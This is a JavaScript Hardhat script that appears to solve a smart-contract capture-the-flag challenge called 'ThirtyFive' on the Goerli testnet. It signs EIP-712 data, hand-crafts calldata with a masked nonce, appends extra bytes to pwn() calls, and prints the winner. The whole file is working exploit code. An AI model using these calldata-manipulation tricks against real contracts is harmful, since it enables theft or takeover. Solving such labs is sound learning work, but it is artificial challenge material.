const { ethers } = require("hardhat");
const { defaultAbiCoder, Interface } = require("@ethersproject/abi");
const { getNetwork } = require("@ethersproject/providers");

async function getContract(user) {
  const ThirtyFive = await ethers.getContractFactory("ThirtyFive", user);
  // Maya contract address (on goerli network): 0x302e61d03f91773a6618e50a1ef973993e28cc61
  const thirtyFive = ThirtyFive.attach(
    "0x302e61d03f91773a6618e50a1ef973993e28cc61"
  );
  return thirtyFive;
}

async function main() {
  let [user] = await ethers.getSigners();
  let thirtyFive = await getContract(user);

  // Preparing arguments for signItLikeYouMeanIt() function call
  const constructorData =
    "0x00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000a546869727479466976650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000043133333700000000000000000000000000000000000000000000000000000000";
  const [name, version] = defaultAbiCoder.decode(
    ["string", "string"],
    constructorData
  );
  const { chainId } = getNetwork("goerli");

  const domain = {
    name: name,
    version: version,
    chainId: chainId,
    verifyingContract: thirtyFive.address,
  };

  const types = {
    SIGNING: [
      { name: "nonce", type: "uint16" },
      { name: "expiry", type: "uint256" },
    ],
  };

  const value = {
    nonce: 1,
    expiry: ethers.constants.MaxUint256,
  };

  const signature = await user._signTypedData(domain, types, value);

  const signItLikeYouMeanItABI = [
    "function signItLikeYouMeanIt(uint16 nonce, uint256 deadline, bytes memory signature)",
  ];
  const signItLikeYouMeanItIface = new Interface(signItLikeYouMeanItABI);
  const dataEncoded = signItLikeYouMeanItIface.encodeFunctionData(
    "signItLikeYouMeanIt",
    [value.nonce, value.expiry, signature]
  );

  // Editing encoded data with mask putted on nonce argument
  const funcSelector = dataEncoded.slice(0, 10);
  const nonceMask =
    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  const restOfArgs = dataEncoded.slice(70);
  const newDataEncoded = funcSelector + nonceMask + restOfArgs;

  // Sending tx to challenge contract with above encoded data
  await user.sendTransaction({
    to: thirtyFive.address,
    data: newDataEncoded,
  });

  // Getting token
  const tx = await thirtyFive.giveMeMyToken();
  const confirmedTx = await tx.wait();
  const event = confirmedTx.events.find((event) => event.event === "TokenGen");
  const { token } = event.args;
  console.log("First call to pwn() function... \n");
  await thirtyFive.pwn(token);
  console.log("Second call to pwn() function... \n");
  await pwnCall(thirtyFive.address, user, token, "22");
  console.log("Third call to pwn() function... \n");
  await pwnCall(thirtyFive.address, user, token, "33");
  console.log(await thirtyFive.HackerWho());
}

async function pwnCall(contractAddress, caller, funcArg, someData) {
  const pwnAbi = ["function pwn(bytes32 token)"];
  const pwnIface = new Interface(pwnAbi);
  const encodedArg = pwnIface.encodeFunctionData("pwn", [funcArg]);
  const newEncodedArg = encodedArg + someData;
  await caller.sendTransaction({
    to: contractAddress,
    data: newEncodedArg,
  });
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
